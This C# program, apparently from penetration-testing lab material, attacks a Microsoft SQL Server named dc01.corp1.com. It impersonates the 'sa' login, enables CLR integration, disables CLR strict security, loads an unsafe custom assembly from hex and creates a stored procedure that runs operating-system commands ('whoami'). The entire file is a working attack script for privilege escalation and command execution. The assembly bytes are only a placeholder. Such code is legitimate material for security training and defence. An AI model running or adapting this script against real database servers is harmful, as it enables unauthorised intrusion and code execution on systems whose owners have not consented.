using System;
using System.Data.SqlClient;

namespace AssemblyLoad
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";

            //The default database in MS SQL is called “master”
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            String impersonateUser = "EXECUTE AS LOGIN = 'sa'"; 
            String enable_options = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
            String createAsm = "CREATE ASSEMBLY myAssembly FROM 0X4DHEXFORYOURDLL WITH PERMISSION_SET = UNSAFE;";
            String createPro = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec]; ";
            String execCmd = "EXEC cmdExec 'whoami';";

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enable_options, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(createAsm, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(createPro, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            Console.WriteLine("Result of command is: " + reader[0]);
            reader.Close();

            con.Close();
           

        }
    }
}
